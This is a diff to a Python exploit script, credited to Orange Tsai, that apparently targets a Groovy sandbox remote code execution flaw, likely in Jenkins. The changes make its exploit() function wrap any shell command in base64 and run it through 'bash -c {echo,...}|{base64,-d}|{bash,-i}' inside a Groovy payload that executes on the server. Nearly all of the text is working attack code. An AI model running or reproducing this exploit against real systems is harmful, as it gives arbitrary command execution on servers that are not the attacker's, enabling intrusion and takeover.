@@ -1,10 +1,11 @@
 #!/usr/bin/python
 # coding: UTF-8
 # author: Orange Tsai(@orange_8361)
-# 
+#
 
 import sys
 import requests
+import base64
 from enum import Enum
 
 # remove bad SSL warnings
@@ -72,9 +73,12 @@ def check(url):
     return flag
 
 def exploit(url, cmd):
-    payload = 'public class x{public x(){new String("%s".decodeHex()).execute()}}' % cmd.encode('hex')
+    base64_cmd = 'bash -c {echo,%s}|{base64,-d}|{bash,-i}' % base64.b64encode(cmd)
+    print '[+] Original CMD: %s' % cmd
+    print '[+] B64encoded CMD: %s' % base64_cmd
+    payload = 'public class x{public x(){new String("%s".decodeHex()).execute()}}' % base64_cmd.encode('hex')
     params = {
-        'sandbox': True, 
+        'sandbox': True,
         'value': payload
     }
 
